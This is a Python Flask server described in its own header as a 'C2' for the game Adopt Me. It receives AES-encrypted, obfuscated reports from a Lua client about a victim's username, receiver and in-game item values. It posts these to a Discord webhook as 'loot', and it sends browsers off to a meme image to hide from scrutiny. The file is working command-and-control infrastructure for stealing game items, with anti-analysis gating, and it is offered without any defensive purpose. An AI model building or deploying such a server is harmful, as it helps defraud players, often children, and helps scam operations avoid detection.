# server.py
# Adopt Me C2 — com gate anti-browser
# dependencies: pip install flask cryptography requests python-dotenv

import os
import json
import time
import hmac
import hashlib
from datetime import datetime, timezone

import requests
from flask import Flask, request, jsonify, redirect, make_response
from dotenv import load_dotenv
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

load_dotenv()

# ============================================================
# config
# ============================================================
WEBHOOK_URL   = os.environ.get("DISCORD_WEBHOOK", "")
C2_SECRET     = os.environ.get("C2_SECRET", "O0fSWuFXR0r")
AES_KEY_RAW   = hashlib.sha256(C2_SECRET.encode()).digest()
LISTEN_HOST   = os.environ.get("LISTEN_HOST", "0.0.0.0")
LISTEN_PORT   = int(os.environ.get("LISTEN_PORT", "5000"))
RATE_WINDOW   = 2.0
GATE_TTL      = 30.0    # seconds a valid request timestamp stays valid
REDIRECT_URL  = "https://iili.io/nOhRu9V.md.png"

# shared secret the client must send as header — keep this out of the Lua
GATE_TOKEN    = os.environ.get("GATE_TOKEN", "change-me-in-env")

app = Flask(__name__)
_last_seen = {}


# ============================================================
# AES-256-CBC decrypt
# ============================================================
def aes_decrypt_hex(hex_string: str) -> bytes:
    raw = bytes.fromhex(hex_string)
    iv         = raw[:16]
    ciphertext = raw[16:]

    cipher    = Cipher(algorithms.AES(AES_KEY_RAW), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded    = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


# ============================================================
# custom hex decoder (mirror of client decodeUserBlob)
# ============================================================
def decode_blob(blob: str) -> str | None:
    try:
        out = bytearray()
        pos = 0
        if pos + 2 > len(blob):
            return None
        b = int(blob[pos:pos + 2], 16)
        if b == (189 ^ 2024):
            return out.decode("utf-8", errors="replace")

        byte_val = (b - 2024) % 256
        out.append(byte_val)
        pos += 2
        counter = (2024 + byte_val) % 256

        while True:
            cur = counter
            if pos + 2 > len(blob):
                return None
            hv = int(blob[pos:pos + 2], 16)
            if hv == (189 ^ cur):
                return out.decode("utf-8", errors="replace")
            decoded = (hv - cur) % 256
            out.append(decoded)
            pos += 2
            counter = (cur + decoded) % 256

            if pos + 2 > len(blob):
                return None
            nbv = int(blob[pos:pos + 2], 16)
            if nbv == (189 ^ cur):
                return out.decode("utf-8", errors="replace")
            nbd = (nbv - cur) % 256
            out.append(nbd)
            pos += 2
            counter = (cur + nbd) % 256
    except Exception as e:
        print(f"[decode_blob] {e}")
        return None


# ============================================================
# signature
# ============================================================
def hash32(s: str) -> int:
    h = 0
    for ch in s:
        h = (h * 31 + ord(ch)) % 4294967296
    return h


def sign_payload(a: str, b: str) -> str:
    combined = str(a) + str(b)
    salt = "dusvhpekijwlolr"
    return format(hash32(salt + combined), "08x")


# ============================================================
# gate — the anti-browser layer
# ============================================================
def gate_ok() -> tuple[bool, str]:
    """Returns (ok, reason). Checks header token, client header, and age."""
    token = request.headers.get("X-Gate-Token", "")
    if not token or not hmac.compare_digest(token, GATE_TOKEN):
        return False, "bad_token"

    client_kind = request.headers.get("X-Client", "")
    if client_kind != "c2-lua":
        return False, "bad_client"

    ua = request.headers.get("User-Agent", "")
    # browser UAs contain "Mozilla" — Lua's request() doesn't
    if "mozilla" in ua.lower():
        return False, "browser_ua"

    age_header = request.headers.get("X-Gate-Ts", "")
    if not age_header:
        return False, "no_ts"
    try:
        age = abs(time.time() - float(age_header))
    except ValueError:
        return False, "bad_ts"
    if age > GATE_TTL:
        return False, "stale_ts"

    return True, "ok"


# ============================================================
# browser detection / redirect helper
# ============================================================
def looks_like_browser() -> bool:
    ua = request.headers.get("User-Agent", "").lower()
    if "mozilla" in ua or "chrome" in ua or "safari" in ua or "firefox" in ua:
        return True
    if request.headers.get("Sec-Fetch-Mode") or request.headers.get("Sec-Fetch-Site"):
        return True
    if request.headers.get("Accept", "").startswith("text/html"):
        return True
    return False


def bounce():
    """Redirect the browser to the meme image, then clear the page."""
    resp = make_response(redirect(REDIRECT_URL, code=302))
    resp.headers["Cache-Control"] = "no-store"
    resp.headers["Clear-Site-Data"] = '"cache", "cookies", "storage"'
    return resp


# ============================================================
# Discord forward
# ============================================================
def forward_to_discord(report: dict):
    if not WEBHOOK_URL:
        print("[discord] WEBHOOK not set")
        return

    prefix   = report.get("prefix", "") or ""
    receiver = report.get("receiver", "?")
    items    = report.get("items", [])
    lines    = [f"`{it.get('name','?')}` ×{it.get('amount',0)} — {float(it.get('value',0)):.2f}" for it in items[:10]]

    embed = {
        "title": "Adopt Me — report",
        "color": 0x5865F2,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": [
            {"name": "username",    "value": f"`{report.get('username','?')}`",  "inline": True},
            {"name": "receiver",    "value": f"`{receiver}`",                    "inline": True},
            {"name": "executor",    "value": f"`{report.get('executor','?')}`",  "inline": True},
            {"name": "place_id",    "value": f"`{report.get('place_id','?')}`",  "inline": True},
            {"name": "total_value", "value": f"`{float(report.get('total_value',0)):.2f}`", "inline": True},
            {"name": "total_count", "value": f"`{report.get('total_count',0)}`", "inline": True},
            {"name": "items",       "value": "\n".join(lines) or "—",            "inline": False},
        ],
        "footer": {"text": f"session: {report.get('_session','?')[:8]} | job: {str(report.get('job_id','?'))[:12]}"}
    }

    if report.get("full_inv_url", "").startswith("http"):
        embed["fields"].append({"name": "full inventory",
                                "value": f"[rubis]({report['full_inv_url']})",
                                "inline": False})

    try:
        requests.post(WEBHOOK_URL,
                      json={"content": prefix + f"@here loot from **{report.get('username','?')}**",
                            "embeds": [embed]},
                      timeout=10)
    except Exception as e:
        print(f"[discord] {e}")


# ============================================================
# rate limit
# ============================================================
def rate_ok(session_id: str) -> bool:
    now  = time.time()
    last = _last_seen.get(session_id, 0)
    if now - last < RATE_WINDOW:
        return False
    _last_seen[session_id] = now
    return True


# ============================================================
# routes
# ============================================================
@app.post("/adm")
def adm():
    # browser sent here by typing URL -> bounce
    if looks_like_browser():
        print("[adm] browser detected, bouncing")
        return bounce()

    ok, reason = gate_ok()
    if not ok:
        print(f"[adm] gate rejected: {reason}")
        return bounce()

    body = request.get_json(silent=True)
    if not body or "e" not in body:
        return bounce()

    try:
        report = json.loads(aes_decrypt_hex(body["e"]).decode("utf-8"))
    except Exception as e:
        print(f"[adm] decrypt: {e}")
        return bounce()

    session_id = report.get("u", "")
    script_id  = report.get("a", "")

    ts_plain = decode_blob(report.get("b", ""))
    if not ts_plain:
        return bounce()

    expected = sign_payload(f"ws={report.get('ws',0)}|ts={ts_plain}", ts_plain)
    if not hmac.compare_digest(expected, report.get("c", "") or ""):
        print(f"[adm] sig mismatch {report.get('username','?')}")
        return bounce()

    report["_session"] = session_id
    forward_to_discord(report)

    print(f"[adm] {report.get('username')} -> {report.get('receiver')} "
          f"({report.get('total_count')} items, {float(report.get('total_value',0)):.2f})")
    return jsonify({"ok": True})


@app.post("/check")
def check():
    if looks_like_browser():
        return bounce()
    ok, reason = gate_ok()
    if not ok:
        return bounce()

    body = request.get_json(silent=True)
    if not body or "e" not in body:
        return bounce()

    try:
        data = json.loads(aes_decrypt_hex(body["e"]).decode("utf-8"))
    except Exception:
        return bounce()

    if not rate_ok(data.get("u", "")):
        return jsonify({"ok": False, "err": "rate"}), 429

    return jsonify({"ok": True})


# catch-all: any GET request or unknown path goes to the image
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catchall(path):
    return bounce()


if __name__ == "__main__":
    print(f"[c2] secret  = {C2_SECRET[:4]}…")
    print(f"[c2] key     = {AES_KEY_RAW.hex()[:16]}…")
    print(f"[c2] gate    = {'set' if GATE_TOKEN != 'change-me-in-env' else 'DEFAULT (change!)'}")
    print(f"[c2] listen  = {LISTEN_HOST}:{LISTEN_PORT}")
    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False)
